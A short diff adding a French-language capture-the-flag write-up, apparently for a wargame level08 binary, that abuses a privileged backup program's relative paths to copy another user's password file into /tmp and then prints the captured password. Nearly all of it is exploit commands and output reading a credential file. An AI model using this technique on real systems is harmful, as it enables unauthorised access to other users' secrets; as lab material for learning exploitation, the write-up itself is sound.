@@ -1,0 +1,20 @@
+le program ouvre le fichier ./backups/.log
+puis le fichier argv[1]
+et copie le contenue de argv[1] dans ./backups/argv[1]
+
+on va dans /tmp
+on cree le dossier backups
+/tmp$ mkdir backups
+/tmp$ ln -s /home/users/level08/backups/.log backups/.log
+
+/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+/tmp$ mkdir backups/home
+/tmp$ mkdir backups/home/users
+/tmp$ mkdir backups/home/users/level09
+
+/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+
+/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
